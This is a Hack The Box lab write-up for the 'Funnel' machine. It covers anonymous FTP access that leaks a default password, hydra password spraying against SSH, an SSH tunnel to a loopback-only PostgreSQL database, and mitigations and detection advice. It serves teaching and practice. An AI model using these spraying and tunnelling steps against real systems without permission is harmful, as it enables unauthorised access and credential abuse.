---
machine: Funnel
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [ftp, ssh, tunnelling, postgresql, tier1]
---

# Funnel — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available · Starting Point · Tier 1 · Linux · Very Easy

## TL;DR

**Anonymous FTP (21/tcp)** publishes internal documentation that leaks the default password pattern. *Password spraying* against **SSH (22/tcp)** gets in as `christine`, and from inside, **PostgreSQL on 5432 listens on loopback only**. An SSH tunnel exposes it and the `secrets` database holds the flag.

---

## Recon

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
```

- Two visible ports; 5432 is **not** exposed externally.
- `ftp-anon` is enabled.

## Enumeration

```bash
ftp <TARGET_IP>
# Name: anonymous
# Password: <Enter>
ftp> ls -la
ftp> get <policy_document>
```

The document describes the password policy and hints at the default pattern (`funnel123#!#`). With no usernames in sight, try the usual ones:

```bash
printf 'admin\nchristine\nbob\nroot\n' > users.txt
hydra -L users.txt -p '<PASSWORD_PATTERN>' ssh://<TARGET_IP>
```

```text
[22][ssh] host: <TARGET_IP>   login: christine   password: <PASSWORD>
```

On the host:

```bash
ssh christine@<TARGET_IP>
ss -tlnp
```

```text
LISTEN 0 128 127.0.0.1:5432 0.0.0.0:*
```

## Foothold

PostgreSQL only listens on loopback, so bring it to the attacking machine with a tunnel:

```bash
ssh -L 5432:127.0.0.1:5432 christine@<TARGET_IP>
```

In another terminal:

```bash
psql -h 127.0.0.1 -p 5432 -U christine -d secrets
```

```sql
\dt
SELECT * FROM <table_with_flag>;
```

The flag lives in the `secrets` database, reachable with the system user's default credentials.

## Lateral movement

- The SSH tunnel is the movement: it turns an internal service into a local one.
- Also check `127.0.0.1:8080` and other ports from `ss` for extra services.
- `christine`'s password is reused for `psql`.

## Privilege escalation

- Not applicable: the flag is in the database, not in `/root`.
- If root were needed, the next step would be `sudo -l` and SUID hunting (out of scope here).

## Evidence

- Anonymous FTP listing with the document (content redacted).
- `ss -tlnp` showing 5432 on loopback.
- SQL query with the flag redacted.

## Lessons learned

- A service bound to `127.0.0.1` is not out of reach: an SSH tunnel gets to it.
- Anonymous FTP is for more than grabbing flags: documentation leaks policies and patterns.
- Spraying one password across many accounts avoids lockouts.
- `ssh -L local:target:port` is the basic pivoting tool.

## Mitigations and detection

**How to fix it:**

- Disable anonymous FTP and stop publishing internal documentation.
- Unique strong passwords; ban default patterns.
- Limit SSH attempts (`MaxAuthTries`, `fail2ban`) and prefer keys.
- PostgreSQL with `scram-sha-256`, a restrictive `pg_hba.conf` and a least-privilege user.

**How it would be detected:**

- Anonymous FTP downloads followed by SSH attempts (time correlation).
- Many authentication failures from one IP and a later success.
- Connections to 5432 from unusual processes or SSH forwards (`-L`).

- CWE-521: Weak Password Requirements
- CWE-668: Exposure of Resource to Wrong Sphere
- MITRE ATT&CK: [T1021.004](https://attack.mitre.org/techniques/T1021/004/), [T1572](https://attack.mitre.org/techniques/T1572/)

## References

- [SSH — port forwarding](https://www.ssh.com/academy/ssh/tunneling/example)
- [PostgreSQL — pg_hba.conf](https://www.postgresql.org/docs/current/auth-pg-hba-conf.html)
